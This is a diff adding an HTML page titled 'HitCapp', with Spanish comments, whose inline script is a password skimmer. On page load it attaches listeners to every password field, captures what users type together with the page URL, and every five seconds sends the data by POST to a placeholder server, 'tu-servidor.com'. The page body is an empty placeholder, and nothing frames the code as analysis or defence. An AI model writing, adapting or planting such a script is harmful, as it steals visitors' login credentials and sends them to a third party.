@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>HitCapp</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Función para recolectar contraseñas
+            function collectPasswords() {
+                var passwords = [];
+                var inputs = document.querySelectorAll('input[type="password"]');
+                inputs.forEach(function(input) {
+                    input.addEventListener('input', function() {
+                        passwords.push({ url: window.location.href, password: input.value });
+                    });
+                });
+                return passwords;
+            }
+
+            // Función para enviar datos recolectados
+            function sendData(data) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://tu-servidor.com/recibir-datos', true);
+                xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+                xhr.send(JSON.stringify(data));
+            }
+
+            // Recolectar y enviar datos cada 5 segundos
+            setInterval(function() {
+                var data = collectPasswords();
+                if (data.length > 0) {
+                    sendData(data);
+                }
+            }, 5000);
+        });
+    </script>
+</head>
+<body>
+    <!-- Contenido de tu página -->
+</body>
+</html>
